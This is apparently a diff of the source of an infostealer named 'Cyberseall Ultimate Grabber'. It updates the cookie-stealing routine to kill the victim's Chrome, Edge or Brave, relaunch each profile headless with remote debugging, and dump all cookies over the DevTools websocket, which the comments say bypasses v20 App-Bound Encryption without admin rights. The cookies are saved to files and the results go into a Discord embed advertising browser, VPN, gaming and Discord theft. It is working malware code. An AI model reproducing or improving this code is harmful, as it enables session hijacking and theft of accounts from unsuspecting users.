@@ -16,6 +16,12 @@ import psutil
 import subprocess
 
 try:
+    import websocket
+except ImportError:
+    subprocess.run([__import__('sys').executable, '-m', 'pip', 'install', 'websocket-client', '--quiet'], capture_output=True)
+    import websocket
+
+try:
     from Crypto.Cipher import AES, ChaCha20_Poly1305
 except:
     __import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome',''])
@@ -1517,165 +1523,159 @@ class CyberseallGrabber:
 
     def cookies(self):
         """
-        ULTIMATE COOKIE EXTRACTOR - Extrahiert alle Browser-Cookies
+        ULTIMATE COOKIE EXTRACTOR - Chrome Remote Debugging Protocol
+        Bypass v20 App-Bound Encryption ohne Admin-Rechte
         """
         try:
             cookies_data = []
             
-            # Browser-Konfiguration
-            browsers = {
+            # Browser-Konfiguration für Remote Debugging
+            DEBUG_PORT = 9222
+            LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
+            APP_DATA = os.getenv('APPDATA')
+            PROGRAM_FILES = os.getenv('PROGRAMFILES')
+            PROGRAM_FILES_X86 = os.getenv('PROGRAMFILES(X86)')
+            
+            browsers_config = {
                 'Chrome': {
-                    'base': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                    'bin': rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe",
+                    'user_data': rf'{LOCAL_APP_DATA}\Google\Chrome\User Data',
                     'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
                 },
                 'Edge': {
-                    'base': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+                    'bin': rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe",
+                    'user_data': rf'{LOCAL_APP_DATA}\Microsoft\Edge\User Data',
                     'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3"]
                 },
                 'Brave': {
-                    'base': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+                    'bin': rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe",
+                    'user_data': rf'{LOCAL_APP_DATA}\BraveSoftware\Brave-Browser\User Data',
                     'profiles': ["Default", "Profile 1", "Profile 2"]
                 }
             }
             
-            def decrypt_cookie_value(encrypted_value, master_key):
-                """Entschlüsselt Cookie-Werte"""
+            def close_browser(bin_path):
+                """Browser-Prozesse beenden"""
                 try:
-                    if not encrypted_value:
-                        return ""
-                    
-                    # v10/v11/v20 Entschlüsselung
-                    if encrypted_value[:3] in [b'v10', b'v11', b'v20']:
-                        if encrypted_value[:3] == b'v20':
-                            # v20 App-Bound Encryption
-                            try:
-                                nonce = encrypted_value[3:15]
-                                ciphertext = encrypted_value[15:-16]
-                                tag = encrypted_value[-16:]
-                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-                                return decrypted.decode('utf-8', errors='ignore')
-                            except:
-                                pass
-                        else:
-                            # v10/v11 Standard
-                            try:
-                                nonce = encrypted_value[3:15]
-                                ciphertext = encrypted_value[15:]
-                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                decrypted = cipher.decrypt(ciphertext[:-16])
-                                return decrypted.decode('utf-8', errors='ignore')
-                            except:
-                                pass
-                    
-                    # DPAPI Fallback
-                    try:
-                        result = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
-                        if result and result[1]:
-                            return result[1].decode('utf-8', errors='ignore')
-                    except:
-                        pass
-                    
-                    return ""
+                    import pathlib
+                    proc_name = pathlib.Path(bin_path).name
+                    subprocess.run(f'taskkill /F /IM {proc_name}', check=False, shell=False, 
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 except:
-                    return ""
+                    pass
+            
+            def start_browser_debug(bin_path, user_data_path, profile=None):
+                """Browser mit Remote Debugging starten"""
+                try:
+                    args = [
+                        bin_path,
+                        '--restore-last-session',
+                        f'--remote-debugging-port={DEBUG_PORT}',
+                        '--remote-allow-origins=*',
+                        '--headless',
+                        f'--user-data-dir={user_data_path}'
+                    ]
+                    
+                    if profile and profile != "Default":
+                        args.append(f'--profile-directory={profile}')
+                    
+                    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                except:
+                    return None
+            
+            def get_debug_ws_url():
+                """WebSocket Debug URL abrufen"""
+                try:
+                    import time
+                    time.sleep(2)  # Warte bis Browser gestartet ist
+                    response = requests.get(f'http://localhost:{DEBUG_PORT}/json', timeout=5)
+                    data = response.json()
+                    return data[0]['webSocketDebuggerUrl'].strip()
+                except:
+                    return None
+            
+            def get_all_cookies_debug(ws_url):
+                """Alle Cookies über WebSocket Debug Protocol abrufen"""
+                try:
+                    import websocket
+                    ws = websocket.create_connection(ws_url, timeout=10)
+                    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
+                    response = ws.recv()
+                    response_data = json.loads(response)
+                    cookies = response_data.get('result', {}).get('cookies', [])
+                    ws.close()
+                    return cookies
+                except:
+                    return []
             
             # Extrahiere Cookies von allen Browsern
-            for browser_name, browser_info in browsers.items():
-                base_path = browser_info['base']
-                if not os.path.exists(base_path):
+            for browser_name, config in browsers_config.items():
+                if not os.path.exists(config['bin']):
                     continue
                 
-                # Master Key laden
-                master_key = None
-                try:
-                    state_file = os.path.join(base_path, "Local State")
-                    if os.path.exists(state_file):
-                        with open(state_file, "r", encoding="utf-8") as f:
-                            local_state = json.loads(f.read())
-                            encrypted_key = local_state["os_crypt"]["encrypted_key"]
-                            master_key = base64.b64decode(encrypted_key)[5:]
-                            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                except:
-                    continue
-                
-                if not master_key:
-                    continue
-                
-                # Extrahiere von allen Profilen
-                for profile in browser_info['profiles']:
-                    profile_path = os.path.join(base_path, profile)
+                # Für jeden Browser alle Profile durchgehen
+                for profile in config['profiles']:
+                    profile_path = os.path.join(config['user_data'], profile)
                     if not os.path.exists(profile_path):
                         continue
                     
-                    cookies_db_path = os.path.join(profile_path, "Network", "Cookies")
-                    if not os.path.exists(cookies_db_path):
-                        continue
-                    
-                    # Temporäre Kopie erstellen
-                    temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_cookies.db")
                     try:
-                        if os.path.exists(temp_cookies_db):
-                            os.remove(temp_cookies_db)
-                        shutil.copy2(cookies_db_path, temp_cookies_db)
-                    except:
-                        continue
-                    
-                    # Cookies aus DB extrahieren
-                    try:
-                        conn = sqlite3.connect(temp_cookies_db)
-                        cursor = conn.cursor()
+                        # Browser schließen falls läuft
+                        close_browser(config['bin'])
                         
-                        cursor.execute("""
-                            SELECT host_key, name, path, encrypted_value, expires_utc, 
-                                   is_secure, is_httponly, creation_utc, last_access_utc
-                            FROM cookies 
-                            ORDER BY last_access_utc DESC 
-                            LIMIT 1000
-                        """)
+                        # Browser mit Debug-Modus starten
+                        browser_process = start_browser_debug(config['bin'], config['user_data'], profile)
+                        if not browser_process:
+                            continue
                         
-                        profile_cookies = []
-                        for row in cursor.fetchall():
-                            host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, creation_utc, last_access_utc = row
-                            
-                            # Cookie-Wert entschlüsseln
-                            decrypted_value = decrypt_cookie_value(encrypted_value, master_key)
-                            
-                            if decrypted_value and len(decrypted_value) > 0:
+                        # WebSocket URL abrufen
+                        ws_url = get_debug_ws_url()
+                        if not ws_url:
+                            browser_process.terminate()
+                            continue
+                        
+                        # Cookies über Debug Protocol abrufen
+                        debug_cookies = get_all_cookies_debug(ws_url)
+                        
+                        # Browser beenden
+                        browser_process.terminate()
+                        close_browser(config['bin'])
+                        
+                        # Cookies verarbeiten
+                        for cookie in debug_cookies:
+                            try:
                                 cookie_info = {
                                     'browser': f"{browser_name}-{profile}",
-                                    'host': host_key,
-                                    'name': name,
-                                    'path': path,
-                                    'value': decrypted_value[:100] + "..." if len(decrypted_value) > 100 else decrypted_value,
-                                    'expires': expires_utc,
-                                    'secure': bool(is_secure),
-                                    'httponly': bool(is_httponly),
-                                    'created': creation_utc,
-                                    'accessed': last_access_utc
+                                    'host': cookie.get('domain', ''),
+                                    'name': cookie.get('name', ''),
+                                    'path': cookie.get('path', '/'),
+                                    'value': cookie.get('value', '')[:100] + "..." if len(cookie.get('value', '')) > 100 else cookie.get('value', ''),
+                                    'expires': cookie.get('expires', 0),
+                                    'secure': cookie.get('secure', False),
+                                    'httponly': cookie.get('httpOnly', False),
+                                    'samesite': cookie.get('sameSite', ''),
+                                    'size': cookie.get('size', 0)
                                 }
-                                profile_cookies.append(cookie_info)
+                                cookies_data.append(cookie_info)
+                            except:
+                                continue
                         
-                        if profile_cookies:
-                            cookies_data.extend(profile_cookies)
+                        # Kurze Pause zwischen Profilen
+                        import time
+                        time.sleep(1)
                         
-                        cursor.close()
-                        conn.close()
-                        
-                        try:
-                            os.remove(temp_cookies_db)
-                        except:
-                            pass
-                            
                     except Exception as e:
                         try:
-                            os.remove(temp_cookies_db)
+                            if 'browser_process' in locals():
+                                browser_process.terminate()
+                            close_browser(config['bin'])
                         except:
                             pass
+                        continue
             
             self.co = cookies_data
             
-            # Cookies in Datei speichern
+            # Cookies in Dateien speichern
             if cookies_data:
                 try:
                     # JSON Format für strukturierte Daten
@@ -1684,7 +1684,7 @@ class CyberseallGrabber:
                     
                     # TXT Format für einfache Lesbarkeit
                     with open(os.path.join(self.d, "cookies.txt"), "w", encoding="utf-8") as f:
-                        f.write("BROWSER COOKIES EXTRACTOR\n")
+                        f.write("BROWSER COOKIES EXTRACTOR (Remote Debug Protocol)\n")
                         f.write("=" * 60 + "\n\n")
                         
                         # Gruppiere nach Browser
@@ -1699,20 +1699,23 @@ class CyberseallGrabber:
                             f.write(f"{browser.upper()} ({len(browser_cookies)} cookies)\n")
                             f.write("-" * 50 + "\n")
                             
-                            for cookie in browser_cookies[:20]:  # Limitiere auf 20 pro Browser
+                            for cookie in browser_cookies[:25]:  # Zeige 25 pro Browser
                                 f.write(f"Host: {cookie['host']}\n")
                                 f.write(f"Name: {cookie['name']}\n")
                                 f.write(f"Value: {cookie['value']}\n")
                                 f.write(f"Path: {cookie['path']}\n")
                                 f.write(f"Secure: {cookie['secure']} | HttpOnly: {cookie['httponly']}\n")
+                                f.write(f"SameSite: {cookie.get('samesite', 'None')} | Size: {cookie.get('size', 0)} bytes\n")
                                 f.write("-" * 30 + "\n")
                             
-                            if len(browser_cookies) > 20:
-                                f.write(f"... and {len(browser_cookies) - 20} more cookies\n")
+                            if len(browser_cookies) > 25:
+                                f.write(f"... and {len(browser_cookies) - 25} more cookies\n")
                             f.write("\n")
                         
                         f.write("=" * 60 + "\n")
                         f.write(f"TOTAL COOKIES EXTRACTED: {len(cookies_data)}\n")
+                        f.write("Extraction Method: Chrome Remote Debugging Protocol\n")
+                        f.write("Bypasses v20 App-Bound Encryption without Admin rights\n")
                         f.write("=" * 60 + "\n")
                 except:
                     pass
@@ -2478,11 +2481,11 @@ module.exports = require('./core.asar');
             
             embed = {
                 "embeds": [{
-                    "title": "CYBERSEALL ULTIMATE GRABBER v6.1",
+                    "title": "CYBERSEALL ULTIMATE GRABBER v6.2",
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "Cyberseall ULTIMATE v6.1 - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "Cyberseall ULTIMATE v6.2 - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
